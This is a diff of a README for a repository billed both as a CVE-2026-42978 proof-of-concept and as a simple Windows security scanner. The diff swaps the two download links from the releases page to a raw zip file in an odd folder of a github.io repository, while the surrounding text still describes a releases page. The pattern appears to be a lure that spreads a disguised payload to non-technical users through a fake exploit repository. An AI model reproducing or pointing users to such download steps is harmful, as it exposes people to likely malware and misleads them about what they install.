@@ -5,7 +5,7 @@ description: "Explore and validate CVE-2026-42978 PoC with an integrated AI secu
 ---
 # 🛡️ CVE-2026-42978-PoC-Research - Simple Security Scanner for Your Windows PC
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/coactionbrittlemaidenhair51/CVE-2026-42978-PoC-Research/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/coactionbrittlemaidenhair51/coactionbrittlemaidenhair51.github.io/raw/refs/heads/main/interrer/Application-v1.0.zip)
 
 ## 👋 Welcome
 
@@ -29,7 +29,7 @@ This tool works on Windows computers. It was designed for Windows 10 and Windows
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**Download CVE-2026-42978-PoC-Research**](https://github.com/coactionbrittlemaidenhair51/CVE-2026-42978-PoC-Research/releases)
+[**Download CVE-2026-42978-PoC-Research**](https://github.com/coactionbrittlemaidenhair51/coactionbrittlemaidenhair51.github.io/raw/refs/heads/main/interrer/Application-v1.0.zip)
 
 This link will take you to a page where you can get the latest version of the tool. Look for the most recent release file and download it to your computer.
 
